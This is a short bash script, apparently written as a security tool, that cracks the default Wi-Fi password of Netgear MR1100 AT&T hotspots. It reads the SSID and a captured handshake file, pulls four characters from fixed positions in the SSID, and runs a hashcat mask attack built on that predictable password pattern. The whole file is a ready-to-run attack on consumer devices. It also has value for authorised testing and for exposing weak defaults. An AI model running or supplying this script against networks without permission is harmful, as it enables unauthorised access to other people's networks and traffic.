#!/bin/bash
#                                                                                                  
# Name: mr1100_creds.sh                                                                                
# Version: 0.1.0                                                                                      
# Author: bmshema
# Description: Executes a mask attack with Hashcat to exploit Netgear MR1100 AT&T hotspot default credentials

# Input variables for SSID and hash file name
echo 'SSID: '
read SSID
# Takes hashcat hash type 22000 format
echo 'Hashfile Name: '
read HASHFILE

# SSID positional variables
SECOND=${SSID:9:1}
FOURTH=${SSID:10:1}
SIXTH=${SSID:12:1}
EIGHTH=${SSID:11:1}

# Hashcat attack
hashcat -a 3 -m 22000 $HASHFILE ?a${SECOND}?a${FOURTH}?a${SIXTH}?a${EIGHTH}
